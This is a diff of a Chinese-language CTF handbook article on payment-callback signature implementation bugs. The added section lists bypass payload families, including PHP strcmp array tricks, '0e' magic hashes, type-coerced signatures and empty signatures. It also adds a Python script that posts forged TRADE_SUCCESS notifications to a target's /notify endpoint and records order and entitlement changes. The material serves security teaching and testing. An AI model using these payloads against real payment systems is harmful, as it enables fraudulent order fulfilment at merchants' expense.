@@ -16,10 +16,10 @@ signals: ["implementation bugs", "实现缺陷", "strcmp绕过", "== vs ===", "t
 mcp_tools: ["http_probe", "kb_router"]
 keywords: ["签名实现缺陷", "strcmp绕过", "timing attack", "PHP type juggling", "HMAC时序攻击", "异常绕过", "支付回调签名", "magic hash"]
 difficulty: "advanced"
-tags: ["signature", "implementation", "php", "python", "timing-attack", "web-security", "ctf"]
+tags: ["signature", "implementation", "php", "python", "timing-attack", "payment", "ctf"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/01-algorithm", "ctf-website/12-payment/payment-callback-async"]
+related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/01-algorithm", "ctf-website/13-signature/04-canonicalization", "ctf-website/13-signature/06-replay-nonce", "ctf-website/12-payment/payment-callback-async", "ctf-website/12-payment/payment-logic"]
 ---
 # Signature Implementation Bugs — 签名实现缺陷深度手册
 
@@ -127,14 +127,53 @@ for path, body, headers in itertools.product(PATHS, PAYLOADS, HEADERS):
     }, ensure_ascii=False))
 ```
 
-### 0.2 成败 Oracle
+### 0.2 实现缺陷到账本 Oracle
 
-| Oracle | 记录字段 | 命中样本 |
-|---|---|---|
-| 响应 oracle | status、body hash、`success/fail/invalid sign` | 同 payload 家族从拒绝变接受 |
-| 订单 oracle | `orders.status`, `payments.status`, `paid_at` | pending → paid |
-| 权益 oracle | `vip_until`, `license_key`, `download_url`, `credits` | 权益新增或 flag 出现 |
-| 幂等 oracle | `transaction_id`, `notify_id`, 发货次数 | 同一事件多次处理 |
+实现缺陷的成败不要靠 `invalid sign` 文案判断。每个 payload 都要绑定一个订单，并读取四类状态：订单、支付流水、发货、用户权益。
+
+| Payload 家族 | 语言信号 | 读状态 | 命中标志 |
+|---|---|---|---|
+| `sign[]=x` | PHP `strcmp/memcmp` | `orders.status`, `payment_logs` | NULL/0 路径进入 success |
+| `0e...` | PHP `==` | `orders.amount`, `payments.status` | magic hash 推进 paid |
+| `sign: true/null/{}` | Node/Python 类型强制 | `delivery/license`, `me` | 复杂类型被当作已验签 |
+| 空签名/短签名 | 任意语言 | `notify_logs`, `wallet` | 短路条件直接发货 |
+| 异常 payload | Python/Java | `error_msg`, `entitlements` | 抛错后仍有业务副作用 |
+
+```python
+# implementation_ledger_oracle.py
+import json
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+def snap(order_id):
+    probes = {
+        "order": f"/api/orders/{order_id}",
+        "payment": f"/api/payment/{order_id}",
+        "delivery": f"/api/orders/{order_id}/delivery",
+        "me": "/api/me",
+    }
+    out = {}
+    for name, path in probes.items():
+        r = S.get(BASE + path, timeout=8, allow_redirects=False)
+        out[name] = {"status": r.status_code, "len": len(r.text), "body": r.text[:240]}
+    return out
+
+def probe_impl(order_id, payload, content_type="json"):
+    before = snap(order_id)
+    if content_type == "form":
+        r = S.post(BASE + "/notify", data=payload, timeout=10, allow_redirects=False)
+    else:
+        r = S.post(BASE + "/notify", json=payload, timeout=10, allow_redirects=False)
+    after = snap(order_id)
+    print(json.dumps({"payload": payload, "response": {"status": r.status_code, "body": r.text[:300]}, "before": before, "after": after}, ensure_ascii=False, indent=2))
+
+probe_impl("ORD1", {"out_trade_no": "ORD1", "trade_status": "TRADE_SUCCESS", "total_amount": "0.01", "sign": ""})
+probe_impl("ORD1", {"out_trade_no": "ORD1", "trade_status": "TRADE_SUCCESS", "total_amount": "0.01", "sign": "0e462097431907509062922748828256"})
+```
+
+输出写入 `exports/implementation_ledger_oracle.jsonl`。若响应 rejected 但 `delivery/me` 变化，说明副作用发生在异常返回前；若响应 success 但账本不变，转 canonicalization 看业务字段是否未被采用。
 
 ## 1. PHP 实现缺陷
 
